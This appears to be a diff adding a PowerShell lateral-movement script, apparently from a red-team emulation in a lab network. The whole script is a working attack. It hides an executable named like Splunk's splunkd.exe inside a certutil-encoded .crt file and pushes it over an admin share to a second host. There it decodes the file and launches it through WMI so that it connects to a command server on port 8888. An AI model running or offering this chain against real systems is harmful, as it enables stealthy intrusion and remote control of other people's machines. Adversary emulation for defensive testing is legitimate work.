@@ -1,1 +1,7 @@
 
+certutil -encode C:\Users\Public\splunkd.exe C:\users\public\com.crt | Out-Null;
+Copy-Item -Path "C:\users\public\com.crt" -Destination "\\192.168.56.105\C$\Users\Public\com.crt" -Force;
+Invoke-Command -ComputerName 192.168.56.105 -ScriptBlock {
+    certutil -decode "C:\Users\Public\com.crt" "C:\Users\Public\splunkd.exe";
+    Invoke-WmiMethod -ComputerName . -Class Win32_Process -Name Create -ArgumentList "C:\users\public\splunkd.exe -server http://192.168.56.103:8888 -group red"
+}
